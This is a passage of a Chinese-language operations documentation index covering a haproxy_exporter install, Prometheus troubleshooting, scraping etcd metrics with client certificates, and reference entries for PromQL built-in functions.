/tmp/haproxy_exporter-${EXPORTER_VERSION}.linux-amd64.tar.gz -C /tmp/\nmv /tmp/haproxy_exporter-${EXPORTER_VERSION}.linux-amd64/haproxy_exporter /usr/local/sbin/\n\ncat &gt; /usr/lib/systemd/system/haproxy_exporter.service &lt;&lt;EOF\n[Unit]\nDescription=HAProxy_exporter\nAfter=syslog.target network.target\n\n[Service]\nExecStart=/usr/local/sbin/haproxy_exporter --haproxy.scrape-uri=http://admin:xxxx@localhost:9200/stats;csv\nExecReload=/bin/kill -s HUP \\$MAINPID\nExecStop=/bin/kill -s QUIT \\$MAINPID\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl enable haproxy_exporter\nsystemctl is-enabled haproxy_exporter\nsystemctl start  haproxy_exporter\nsystemctl status haproxy_exporter\n\ncurl http://127.0.0.1:9101/metrics\n</code></pre>"},{"location":"kubernetes/20-prometheus/#42-blackbox","title":"4.2 blackbox","text":"<p>\u53ef\u4ee5\u63a2\u6d4bHTTPS\u3001HTTP\u3001TCP\u3001DNS\u3001ICMP\u3001gRPC\u7b49Endpoints\u3002</p> <pre><code>insecure_tls_verify: true\n</code></pre>"},{"location":"kubernetes/20-prometheus/#43-kube-prometheus-stack","title":"4.3 kube-prometheus-stack","text":"<p>\u63a2\u6d4b apiserver\u3001kubelet \u7ec4\u4ef6\u8fc7\u671f</p>"},{"location":"kubernetes/20-prometheus/#44-x509-certificate","title":"4.4 x509-certificate","text":"<p>\u901a\u8fc7watchFiles\u6587\u4ef6\u7684\u65b9\u5f0f\u63a2\u6d4b\u8fc7\u671f\u65f6\u95f4</p> <pre><code>watchFiles:\n- /var/lib/kubelet/pki/kubelet-client-current.pem\n- /etc/kubernetes/pki/apiserver.crt\n</code></pre>"},{"location":"kubernetes/20-prometheus/#_4","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/20-prometheus/#51-tsdb","title":"5.1 TSDB\u88ab\u9501","text":"<p>\u5e38\u51fa\u73b0\u5728\u5347\u7ea7prometheus\uff0c\u6216\u91cd\u542fprometheus</p> <pre><code>~$ kubectl -n kube-server get po\n\nprometheus-server-8697db8cc8-4hdpc                                1/2     CrashLoopBackOff   282 (3m27s ago)   23h\n\n~$ kubectl -n kube-server logs -f prometheus-server-8697db8cc8-4hdpc prometheus-server\n\u2026\u2026\nts=2022-05-13T23:29:02.926Z caller=main.go:1077 level=error err=\"opening storage failed: lock DB directory: resource temporarily unavailable\"\n</code></pre> <p>\u8fdb\u5165 <code>/opt/data/prometheus/server</code>\u5220\u9664\u6587\u4ef6<code>lock</code></p>"},{"location":"kubernetes/20-prometheus/#52","title":"5.2 \u83b7\u53d6\u6307\u6807","text":"<pre><code># apiserver\ncurl -s $APISERVER/metrics \\\n  --header \"Authorization: Bearer $TOKEN\" \\\n  --cacert /tmp/ca.crt \\\n  -o metrics.txt\n\n# etcd\ncurl -s https://10.101.11.183:2379/metrics \\\n  --cert /etc/kubernetes/pki/etcd/healthcheck-client.crt \\\n  --key /etc/kubernetes/pki/etcd/healthcheck-client.key \\\n  --cacert /etc/kubernetes/pki/etcd/ca.crt\n</code></pre>"},{"location":"kubernetes/20-prometheus/#53-etcds-metrices","title":"5.3 \u83b7\u53d6 etcd's metrices","text":"<pre><code># 1. \u521b\u5efa\u8bc1\u4e66\nkubectl create secret generic etcd-certs \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.crt \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.key \\\n  --from-file=/etc/kubernetes/pki/etcd/ca.crt \\\n  -n kube-server\n\n# 2. helm config\n  extraSecretMounts:\n    - name: etcd-certs\n      mountPath: /var/run/secrets/kubernetes.io/etcd\n      secretName: etcd-certs\n      readOnly: true\n\n# 3. generic config\n  - job_name: kubernetes-etcd\n    honor_timestamps: true\n    scrape_interval: 1m\n    scrape_timeout: 10s\n    metrics_path: /metrics\n    scheme: https\n    tls_config:\n      ca_file: /var/run/secrets/kubernetes.io/etcd/ca.crt\n      cert_file: /var/run/secrets/kubernetes.io/etcd/healthcheck-client.crt\n      key_file: /var/run/secrets/kubernetes.io/etcd/healthcheck-client.key\n      insecure_skip_verify: false\n    follow_redirects: true\n    relabel_configs:\n    - source_labels: [__meta_kubernetes_service_label_app_kubernetes_io_name]\n      separator: ;\n      regex: etcd\n      replacement: $1\n      action: keep\n    kubernetes_sd_configs:\n    - role: endpoints\n      kubeconfig_file: \"\"\n      follow_redirects: true\n      namespaces:\n        own_namespace: false\n        names:\n        - kube-system\n\n# 4. create service\n# Example \n#   https://books.8ops.top/attachment/prometheus/70-generic-secret.sh\n#   https://books.8ops.top/attachment/prometheus/71-prometheus-sd-etcd.yaml\n#   kubectl apply -f 70-generic-secret.sh\n#   kubectl apply -f 71-prometheus-sd-etcd.yaml\n# \n#   kubectl -n kube-system create service clusterip kube-etcd --tcp=2379:2379\nkubectl apply -f - &lt;&lt; EOF\napiVersion: v1\nitems:\n- apiVersion: v1\n  kind: Service\n  metadata:\n    labels:\n      app: kube-etcd\n      app.kubernetes.io/name: etcd\n    name: kube-etcd\n    namespace: kube-system\n  spec:\n    ports:\n    - name: etcd\n      port: 2379\n      protocol: TCP\n      targetPort: 2379\n    type: ClusterIP\n- apiVersion: v1\n  kind: Endpoints\n  metadata:\n    labels:\n      app: kube-etcd\n      k8s-app: etcd\n    name: kube-etcd\n    namespace: kube-system\n  subsets:\n  - addresses:\n    - ip: 10.101.11.240\n    - ip: 10.101.11.114\n    - ip: 10.101.11.154\n    ports:\n    - port: 2379\n      protocol: TCP\nkind: List\nEOF\n\nkubectl -n kube-system label services/kube-etcd app.kubernetes.io/name=etcd\nkubectl -n kube-system get services/kube-etcd endpoints/kube-etcd\n</code></pre>"},{"location":"kubernetes/20-prometheus/#54","title":"5.4 \u5220\u9664\u6570\u636e","text":"<pre><code># \u5339\u914d\u6807\u7b7e\u5220\u9664\u6570\u636e\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={instance=\".*\"}'\n\n# \u6839\u636e\u65f6\u95f4\u5220\u9664\u6570\u636e\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={instance=\".*\"}&amp;start&lt;2023-07-01T00:00:00Z&amp;end=2023-07-30T00:00:00Z'\n</code></pre>"},{"location":"kubernetes/20-promql-func/","title":"PromQL \u5185\u7f6e\u51fd\u6570","text":"<p>Prometheus \u63d0\u4f9b\u4e86\u5176\u5b83\u5927\u91cf\u7684\u5185\u7f6e\u51fd\u6570\uff0c\u53ef\u4ee5\u5bf9\u65f6\u5e8f\u6570\u636e\u8fdb\u884c\u4e30\u5bcc\u7684\u5904\u7406\u3002\u67d0\u4e9b\u51fd\u6570\u6709\u9ed8\u8ba4\u7684\u53c2\u6570\uff0c\u4f8b\u5982\uff1a<code>year(v=vector(time()) instant-vector)</code>\u3002\u5176\u4e2d\u53c2\u6570 <code>v</code> \u662f\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\uff0c\u5982\u679c\u4e0d\u63d0\u4f9b\u8be5\u53c2\u6570\uff0c\u5c06\u4f7f\u7528\u9ed8\u8ba4\u503c <code>vector(time())</code>\u3002instant-vector \u8868\u793a\u53c2\u6570\u7c7b\u578b\u3002</p>"},{"location":"kubernetes/20-promql-func/#abs","title":"abs()","text":"<p><code>abs(v instant-vector)</code> \u8fd4\u56de\u8f93\u5165\u5411\u91cf\u7684\u6240\u6709\u6837\u672c\u7684\u7edd\u5bf9\u503c\u3002</p>"},{"location":"kubernetes/20-promql-func/#absent","title":"absent()","text":"<p><code>absent(v instant-vector)</code>\uff0c\u5982\u679c\u4f20\u9012\u7ed9\u5b83\u7684\u5411\u91cf\u53c2\u6570\u5177\u6709\u6837\u672c\u6570\u636e\uff0c\u5219\u8fd4\u56de\u7a7a\u5411\u91cf\uff1b\u5982\u679c\u4f20\u9012\u7684\u5411\u91cf\u53c2\u6570\u6ca1\u6709\u6837\u672c\u6570\u636e\uff0c\u5219\u8fd4\u56de\u4e0d\u5e26\u5ea6\u91cf\u6307\u6807\u540d\u79f0\u4e14\u5e26\u6709\u6807\u7b7e\u7684\u65f6\u95f4\u5e8f\u5217\uff0c\u4e14\u6837\u672c\u503c\u4e3a1\u3002</p> <p>\u5f53\u76d1\u63a7\u5ea6\u91cf\u6307\u6807\u65f6\uff0c\u5982\u679c\u83b7\u53d6\u5230\u7684\u6837\u672c\u6570\u636e\u662f\u7a7a\u7684\uff0c \u4f7f\u7528 absent \u65b9\u6cd5\u5bf9\u544a\u8b66\u662f\u975e\u5e38\u6709\u7528\u7684\u3002\u4f8b\u5982\uff1a</p> <pre><code># \u8fd9\u91cc\u63d0\u4f9b\u7684\u5411\u91cf\u6709\u6837\u672c\u6570\u636e\nabsent(http_requests_total{method=\"get\"})  =&gt; no data\nabsent(sum(http_requests_total{method=\"get\"}))  =&gt; no data\n\n# \u7531\u4e8e\u4e0d\u5b58\u5728\u5ea6\u91cf\u6307\u6807 nonexistent\uff0c\u6240\u4ee5 \u8fd4\u56de\u4e0d\u5e26\u5ea6\u91cf\u6307\u6807\u540d\u79f0\u4e14\u5e26\u6709\u6807\u7b7e\u7684\u65f6\u95f4\u5e8f\u5217\uff0c\u4e14\u6837\u672c\u503c\u4e3a1\nabsent(nonexistent{job=\"myjob\"})  =&gt; {job=\"myjob\"}  1\n\n# \u6b63\u5219\u5339\u914d\u7684 instance \u4e0d\u4f5c\u4e3a\u8fd4\u56de labels \u4e2d\u7684\u4e00\u90e8\u5206\nabsent(nonexistent{job=\"myjob\",instance=~\".*\"})  =&gt; {job=\"myjob\"}  1\n\n# sum \u51fd\u6570\u8fd4\u56de\u7684\u65f6\u95f4\u5e8f\u5217\u4e0d\u5e26\u6709\u6807\u7b7e\uff0c\u4e14\u6ca1\u6709\u6837\u672c\u6570\u636e\nabsent(sum(nonexistent{job=\"myjob\"}))  =&gt; {}  1\n</code></pre>"},{"location":"kubernetes/20-promql-func/#ceil","title":"ceil()","text":"<p><code>ceil(v instant-vector)</code> \u5c06 v \u4e2d\u6240\u6709\u5143\u7d20\u7684\u6837\u672c\u503c\u5411\u4e0a\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u7684\u6574\u6570\u3002\u4f8b\u5982\uff1a</p> <pre><code>node_load5{instance=\"192.168.1.75:9100\"} # \u7ed3\u679c\u4e3a 2.79\nceil(node_load5{instance=\"192.168.1.75:9100\"}) # \u7ed3\u679c\u4e3a 3\n</code></pre>"},{"location":"kubernetes/20-promql-func/#changes","title":"changes()","text":"<p><code>changes(v range-vector)</code> \u8f93\u5165\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\uff0c \u8fd4\u56de\u8fd9\u4e2a\u533a\u95f4\u5411\u91cf\u5185\u6bcf\u4e2a\u6837\u672c\u6570\u636e\u503c\u53d8\u5316\u7684\u6b21\u6570\uff08\u77ac\u65f6\u5411\u91cf\uff09\u3002\u4f8b\u5982\uff1a</p> <pre><code># \u5982\u679c\u6837\u672c\u6570\u636e\u503c\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u5219\u8fd4\u56de\u7ed3\u679c\u4e3a 1\nchanges(node_load5{instance=\"192.168.1.75:9100\"}[1m]) # \u7ed3\u679c\u4e3a 1\n</code></pre>"},{"location":"kubernetes/20-promql-func/#clamp_max","title":"clamp_max()","text":"<p><code>clamp_max(v instant-vector, max scalar)</code> \u51fd\u6570\uff0c\u8f93\u5165\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\u548c\u6700\u5927\u503c\uff0c\u6837\u672c\u6570\u636e\u503c\u82e5\u5927\u4e8e max\uff0c\u5219\u6539\u4e3a max\uff0c\u5426\u5219\u4e0d\u53d8\u3002\u4f8b\u5982\uff1a</p> <pre><code>node_load5{instance=\"192.168.1.75:9100\"} # \u7ed3\u679c\u4e3a 2.79\nclamp_max(node_load5{instance=\"192.168.1.75:9100\"}, 2) # \u7ed3\u679c\u4e3a 2\n</code></pre>"},{"location":"kubernetes/20-promql-func/#clamp_min","title":"clamp_min()","text":"<p><code>clamp_min(v instant-vector, min scalar)</code> \u51fd\u6570\uff0c\u8f93\u5165\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\u548c\u6700\u5c0f\u503c\uff0c\u6837\u672c\u6570\u636e\u503c\u82e5\u5c0f\u4e8e min\uff0c\u5219\u6539\u4e3a min\uff0c\u5426\u5219\u4e0d\u53d8\u3002\u4f8b\u5982\uff1a</p> <pre><code>node_load5{instance=\"192.168.1.75:9100\"} # \u7ed3\u679c\u4e3a 2.79\nclamp_min(node_load5{instance=\"192.168.1.75:9100\"}, 3) # \u7ed3\u679c\u4e3a 3\n</code></pre>"},{"location":"kubernetes/20-promql-func/#day_of_month","title":"day_of_month()","text":"<p><code>day_of_month(v=vector(time()) instant-vector)</code> \u51fd\u6570\uff0c\u8fd4\u56de\u88ab\u7ed9\u5b9a UTC \u65f6\u95f4\u6240\u5728\u6708\u7684\u7b2c\u51e0\u5929\u3002\u8fd4\u56de\u503c\u8303\u56f4\uff1a1~31\u3002</p>"},{"location":"kubernetes/20-promql-func/#day_of_week","title":"day_of_week()","text":"<p><code>day_of_week(v=vector(time()) instant-vector)</code> \u51fd\u6570\uff0c\u8fd4\u56de\u88ab\u7ed9\u5b9a UTC \u65f6\u95f4\u6240\u5728\u5468\u7684\u7b2c\u51e0\u5929\u3002\u8fd4\u56de\u503c\u8303\u56f4\uff1a0~6\uff0c0 \u8868\u793a\u661f\u671f\u5929\u3002</p>"},{"location":"kubernetes/20-promql-func/#days_in_month","title":"days_in_month()","text":"<p><code>days_in_month(v=vector(time()) instant-vector)</code> \u51fd\u6570\uff0c\u8fd4\u56de\u5f53\u6708\u4e00\u5171\u6709\u591a\u5c11\u5929\u3002\u8fd4\u56de\u503c\u8303\u56f4\uff1a28~31\u3002</p>"},{"location":"kubernetes/20-promql-func/#delta","title":"delta()","text":"<p><code>delta(v range-vector)</code> \u7684\u53c2\u6570\u662f\u4e00\u4e2a\u533a\u95f4\u5411\u91cf\uff0c\u8fd4\u56de\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\u3002\u5b83\u8ba1\u7b97\u4e00\u4e2a\u533a\u95f4\u5411\u91cf v \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u548c\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4e4b\u95f4\u7684\u5dee\u503c\u3002\u7531\u4e8e\u8fd9\u4e2a\u503c\u88ab\u5916\u63a8\u5230\u6307\u5b9a\u7684\u6574\u4e2a\u65f6\u95f4\u8303\u56f4\uff0c\u6240\u4ee5\u5373\u4f7f\u6837\u672c\u503c\u90fd\u662f\u6574\u6570\uff0c\u4f60\u4ecd\u7136\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a\u975e\u6574\u6570\u503c\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u8fd4\u56de\u8fc7\u53bb\u4e24\u5c0f\u65f6\u7684 CPU \u6e29\u5ea6\u5dee\uff1a</p> <pre><code>delta(cpu_temp_celsius{host=\"zeus\"}[2h])\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u53ea\u7528\u5728 Gauge \u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#deriv","title":"deriv()","text":"<p><code>deriv(v range-vector)</code> \u7684\u53c2\u6570\u662f\u4e00\u4e2a\u533a\u95f4\u5411\u91cf,\u8fd4\u56de\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\u3002\u5b83\u4f7f\u7528\u7b80\u5355\u7684\u7ebf\u6027\u56de\u5f52\u8ba1\u7b97\u533a\u95f4\u5411\u91cf v \u4e2d\u5404\u4e2a\u65f6\u95f4\u5e8f\u5217\u7684\u5bfc\u6570\u3002</p> <p>\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u53ea\u7528\u5728 Gauge \u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#exp","title":"exp()","text":"<p><code>exp(v instant-vector)</code> \u51fd\u6570\uff0c\u8f93\u5165\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\uff0c\u8fd4\u56de\u5404\u4e2a\u6837\u672c\u503c\u7684 <code>e</code> \u7684\u6307\u6570\u503c\uff0c\u5373 e \u7684 N \u6b21\u65b9\u3002\u5f53 N \u7684\u503c\u8db3\u591f\u5927\u65f6\u4f1a\u8fd4\u56de <code>+Inf</code>\u3002\u7279\u6b8a\u60c5\u51b5\u4e3a\uff1a</p> <ul> <li><code>Exp(+Inf) = +Inf</code></li> <li><code>Exp(NaN) = NaN</code></li> </ul>"},{"location":"kubernetes/20-promql-func/#floor","title":"floor()","text":"<p><code>floor(v instant-vector)</code> \u51fd\u6570\u4e0e ceil() \u51fd\u6570\u76f8\u53cd\uff0c\u5c06 v \u4e2d\u6240\u6709\u5143\u7d20\u7684\u6837\u672c\u503c\u5411\u4e0b\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u7684\u6574\u6570\u3002</p>"},{"location":"kubernetes/20-promql-func/#histogram_quantile","title":"histogram_quantile()","text":"<p><code>histogram_quantile(\u03c6 float, b instant-vector)</code> \u4ece bucket \u7c7b\u578b\u7684\u5411\u91cf <code>b</code> \u4e2d\u8ba1\u7b97 \u03c6 (0 \u2264 \u03c6 \u2264 1) \u5206\u4f4d\u6570\uff08\u767e\u5206\u4f4d\u6570\u7684\u4e00\u822c\u5f62\u5f0f\uff09\u7684\u6837\u672c\u7684\u6700\u5927\u503c\u3002\uff08\u6709\u5173 \u03c6 \u5206\u4f4d\u6570\u7684\u8be6\u7ec6\u8bf4\u660e\u4ee5\u53ca\u76f4\u65b9\u56fe\u6307\u6807\u7c7b\u578b\u7684\u4f7f\u7528\uff0c\u8bf7\u53c2\u9605\u76f4\u65b9\u56fe\u548c\u6458\u8981\uff09\u3002\u5411\u91cf <code>b</code> \u4e2d\u7684\u6837\u672c\u662f\u6bcf\u4e2a bucket \u7684\u91c7\u6837\u70b9\u6570\u91cf\u3002\u6bcf\u4e2a\u6837\u672c\u7684 labels \u4e2d\u5fc5\u987b\u8981\u6709 <code>le</code> \u8fd9\u4e2a label \u6765\u8868\u793a\u6bcf\u4e2a bucket \u7684\u4e0a\u8fb9\u754c\uff0c\u6ca1\u6709 <code>le</code> \u6807\u7b7e\u7684\u6837\u672c\u4f1a\u88ab\u5ffd\u7565\u3002\u76f4\u65b9\u56fe\u6307\u6807\u7c7b\u578b\u81ea\u52a8\u63d0\u4f9b\u5e26\u6709 <code>_bucket</code> \u540e\u7f00\u548c\u76f8\u5e94\u6807\u7b7e\u7684\u65f6\u95f4\u5e8f\u5217\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>rate()</code> \u51fd\u6570\u6765\u6307\u5b9a\u5206\u4f4d\u6570\u8ba1\u7b97\u7684\u65f6\u95f4\u7a97\u53e3\u3002</p> <p>\u4f8b\u5982\uff0c\u4e00\u4e2a\u76f4\u65b9\u56fe\u6307\u6807\u540d\u79f0\u4e3a <code>employee_age_bucket_bucket</code>\uff0c\u8981\u8ba1\u7b97\u8fc7\u53bb 10 \u5206\u949f\u5185 \u7b2c 90 \u4e2a\u767e\u5206\u4f4d\u6570\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u8868\u8fbe\u5f0f\uff1a</p> <pre><code>histogram_quantile(0.9, rate(employee_age_bucket_bucket[10m]))\n</code></pre> <p>\u8fd4\u56de\uff1a</p> <pre><code>{instance=\"10.0.86.71:8080\",job=\"prometheus\"} 35.714285714285715\n</code></pre> <p>\u8fd9\u8868\u793a\u6700\u8fd1 10 \u5206\u949f\u4e4b\u5185 90% \u7684\u6837\u672c\u7684\u6700\u5927\u503c\u4e3a 35.714285714285715\u3002</p> <p>\u8fd9\u4e2a\u8ba1\u7b97\u7ed3\u679c\u662f\u6bcf\u7ec4\u6807\u7b7e\u7ec4\u5408\u6210\u4e00\u4e2a\u65f6\u95f4\u5e8f\u5217\u3002\u6211\u4eec\u53ef\u80fd\u4e0d\u4f1a\u5bf9\u6240\u6709\u8fd9\u4e9b\u7ef4\u5ea6\uff08\u5982 <code>job</code>\u3001<code>instance</code> \u548c <code>method</code>\uff09\u611f\u5174\u8da3\uff0c\u5e76\u5e0c\u671b\u5c06\u5176\u4e2d\u7684\u4e00\u4e9b\u7ef4\u5ea6\u8fdb\u884c\u805a\u5408\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528 sum() \u51fd\u6570\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u6839\u636e <code>job</code> \u6807\u7b7e\u6765\u5bf9\u7b2c 90 \u4e2a\u767e\u5206\u4f4d\u6570\u8fdb\u884c\u805a\u5408\uff1a</p> <pre><code># histogram_quantile() \u51fd\u6570\u5fc5\u987b\u5305\u542b le \u6807\u7b7e\nhistogram_quantile(0.9, sum(rate(employee_age_bucket_bucket[10m])) by (job, le))\n</code></pre> <p>\u5982\u679c\u8981\u805a\u5408\u6240\u6709\u7684\u6807\u7b7e\uff0c\u5219\u4f7f\u7528\u5982\u4e0b\u8868\u8fbe\u5f0f\uff1a</p> <pre><code>histogram_quantile(0.9,sum(rate(employee_age_bucket_bucket[10m])) by (le))\n</code></pre> <p>[info] \u6ce8\u610f</p> <p><code>histogram_quantile</code> \u8fd9\u4e2a\u51fd\u6570\u662f\u6839\u636e\u5047\u5b9a\u6bcf\u4e2a\u533a\u95f4\u5185\u7684\u6837\u672c\u5206\u5e03\u662f\u7ebf\u6027\u5206\u5e03\u6765\u8ba1\u7b97\u7ed3\u679c\u503c\u7684(\u4e5f\u5c31\u662f\u8bf4\u5b83\u7684\u7ed3\u679c\u672a\u5fc5\u51c6\u786e)\uff0c\u6700\u9ad8\u7684 bucket \u5fc5\u987b\u662f le=\"+Inf\" (\u5426\u5219\u5c31\u8fd4\u56de NaN)\u3002</p> <p>\u5982\u679c\u5206\u4f4d\u6570\u4f4d\u4e8e\u6700\u9ad8\u7684 bucket\uff08+Inf\uff09 \u4e2d\uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u6700\u9ad8\u7684 bucket \u7684\u4e0a\u8fb9\u754c\u3002\u5982\u679c\u8be5 bucket \u7684\u4e0a\u8fb9\u754c\u5927\u4e8e 0\uff0c\u5219\u5047\u8bbe\u6700\u4f4e\u7684 bucket \u7684\u7684\u4e0b\u8fb9\u754c\u4e3a 0\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5728\u8be5 bucket \u5185\u4f7f\u7528\u5e38\u89c4\u7684\u7ebf\u6027\u63d2\u503c\u3002</p> <p>\u5982\u679c\u5206\u4f4d\u6570\u4f4d\u4e8e\u6700\u4f4e\u7684 bucket \u4e2d\uff0c\u5219\u8fd4\u56de\u6700\u4f4e bucket \u7684\u4e0a\u8fb9\u754c\u3002</p> <p>\u5982\u679c b \u542b\u6709\u5c11\u4e8e 2 \u4e2a buckets\uff0c\u90a3\u4e48\u4f1a\u8fd4\u56de <code>NaN</code>\uff0c\u5982\u679c \u03c6 &lt; 0 \u4f1a\u8fd4\u56de <code>-Inf</code>\uff0c\u5982\u679c \u03c6 &gt; 1 \u4f1a\u8fd4\u56de <code>+Inf</code>\u3002</p>"},{"location":"kubernetes/20-promql-func/#holt_winters","title":"holt_winters()","text":"<p><code>holt_winters(v range-vector, sf scalar, tf scalar)</code> \u51fd\u6570\u57fa\u4e8e\u533a\u95f4\u5411\u91cf v\uff0c\u751f\u6210\u65f6\u95f4\u5e8f\u5217\u6570\u636e\u5e73\u6ed1\u503c\u3002\u5e73\u6ed1\u56e0\u5b50 <code>sf</code> \u8d8a\u4f4e, \u5bf9\u65e7\u6570\u636e\u7684\u91cd\u89c6\u7a0b\u5ea6\u8d8a\u9ad8\u3002\u8d8b\u52bf\u56e0\u5b50 <code>tf</code> \u8d8a\u9ad8\uff0c\u5bf9\u6570\u636e\u7684\u8d8b\u52bf\u7684\u8003\u8651\u5c31\u8d8a\u591a\u3002\u5176\u4e2d\uff0c<code>0&lt; sf, tf &lt;=1</code>\u3002</p> <p>holt_winters \u4ec5\u9002\u7528\u4e8e Gauge \u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u3002</p>"},{"location":"kubernetes/20-promql-func/#hour","title":"hour()","text":"<p><code>hour(v=vector(time()) instant-vector)</code> \u51fd\u6570\u8fd4\u56de\u88ab\u7ed9\u5b9a UTC \u65f6\u95f4\u7684\u5f53\u524d\u7b2c\u51e0\u4e2a\u5c0f\u65f6\uff0c\u65f6\u95f4\u8303\u56f4\uff1a0~23\u3002</p>"},{"location":"kubernetes/20-promql-func/#idelta","title":"idelta()","text":"<p>idelta(v range-vector) \u7684\u53c2\u6570\u662f\u4e00\u4e2a\u533a\u95f4\u5411\u91cf, \u8fd4\u56de\u4e00\u4e2a\u77ac\u65f6\u5411\u91cf\u3002\u5b83\u8ba1\u7b97\u6700\u65b0\u7684 2 \u4e2a\u6837\u672c\u503c\u4e4b\u95f4\u7684\u5dee\u503c\u3002</p> <p>\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u53ea\u7528\u5728 Gauge \u7c7b\u578b\u7684\u65f6\u95f4\u5e8f\u5217\u4e0a\u3002</p>"},{"location":"kubernetes/20-promql-func/#increase","title":"increase()","text":"<p><code>increase(v range-vector)</code> \u51fd\u6570\u83b7\u53d6\u533a\u95f4\u5411\u91cf\u4e2d\u7684\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u6837\u672c\u5e76\u8fd4\u56de\u5176\u589e\u957f\u91cf, \u5b83\u4f1a\u5728\u5355\u8c03\u6027\u53d1\u751f\u53d8\u5316\u65f6(\u5982\u7531\u4e8e\u91c7\u6837\u76ee\u6807\u91cd\u542f\u5f15\u8d77\u7684\u8ba1\u6570\u5668\u590d\u4f4d)\u81ea\u52a8\u4e2d\u65ad\u3002\u7531\u4e8e\u8fd9\u4e2a\u503c\u88ab\u5916\u63a8\u5230\u6307\u5b9a\u7684\u6574\u4e2a\u65f6\u95f4\u8303\u56f4\uff0c\u6240\u4ee5\u5373\u4f7f\u6837\u672c\u503c\u90fd\u662f\u6574\u6570\uff0c\u4f60\u4ecd\u7136\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a\u975e\u6574\u6570\u503c\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u8fd4\u56de\u533a\u95f4\u5411\u91cf\u4e2d\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u8fc7\u53bb 5 \u5206\u949f\u5185 HTTP \u8bf7\u6c42\u6570\u7684\u589e\u957f\u6570\uff1a</p> <pre><code>increase(http_requests_total{job=\"apiserver\"}[5m])\n</code></pre> <p><code>increase</code> \u7684\u8fd4\u56de\u503c\u7c7b\u578b\u53ea\u80fd\u662f\u8ba1\u6570\u5668\u7c7b\u578b\uff0c\u4e3b\u8981\u4f5c\u7528\u662f\u589e\u52a0\u56fe\u8868\u548c\u6570\u636e\u7684\u53ef\u8bfb\u6027\u3002\u4f7f\u7528 <code>rate</code> \u51fd\u6570\u8bb0\u5f55\u89c4\u5219\u7684\u4f7f\u7528\u7387\uff0c\u4ee5\u4fbf\u6301\u7eed\u8ddf\u8e2a\u6570\u636e\u6837\u672c\u503c\u7684\u53d8\u5316\u3002</p>"},{"location":"kubernetes/20-promql-func/#irate","title":"irate()","text":"<p><code>irate(v range-vector)</code> \u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u533a\u95f4\u5411\u91cf\u7684\u589e\u957f\u7387\uff0c\u4f46\u662f\u5176\u53cd\u5e94\u51fa\u7684\u662f\u77ac\u65f6\u589e\u957f\u7387\u3002irate \u51fd\u6570\u662f\u901a\u8fc7\u533a\u95f4\u5411\u91cf\u4e2d\u6700\u540e\u4e24\u4e2a\u4e24\u672c\u6570\u636e\u6765\u8ba1\u7b97\u533a\u95f4\u5411\u91cf\u7684\u589e\u957f\u901f\u7387\uff0c\u5b83\u4f1a\u5728\u5355\u8c03\u6027\u53d1\u751f\u53d8\u5316\u65f6(\u5982\u7531\u4e8e\u91c7\u6837\u76ee\u6807\u91cd\u542f\u5f15\u8d77\u7684\u8ba1\u6570\u5668\u590d\u4f4d)\u81ea\u52a8\u4e2d\u65ad\u3002\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u907f\u514d\u5728\u65f6\u95f4\u7a97\u53e3\u8303\u56f4\u5185\u7684\u201c\u957f\u5c3e\u95ee\u9898\u201d\uff0c\u5e76\u4e14\u4f53\u73b0\u51fa\u66f4\u597d\u7684\u7075\u654f\u5ea6\uff0c\u901a\u8fc7irate\u51fd\u6570\u7ed8\u5236\u7684\u56fe\u6807\u80fd\u591f\u66f4\u597d\u7684\u53cd\u5e94\u6837\u672c\u6570\u636e\u7684\u77ac\u65f6\u53d8\u5316\u72b6\u6001\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u8868\u8fbe\u5f0f\u8fd4\u56de\u533a\u95f4\u5411\u91cf\u4e2d\u6bcf\u4e2a\u65f6\u95f4\u5e8f\u5217\u8fc7\u53bb 5 \u5206\u949f\u5185\u6700\u540e\u4e24\u4e2a\u6837\u672c\u6570\u636e\u7684 HTTP \u8bf7\u6c42\u6570\u7684\u589e\u957f\u7387\uff1a</p> 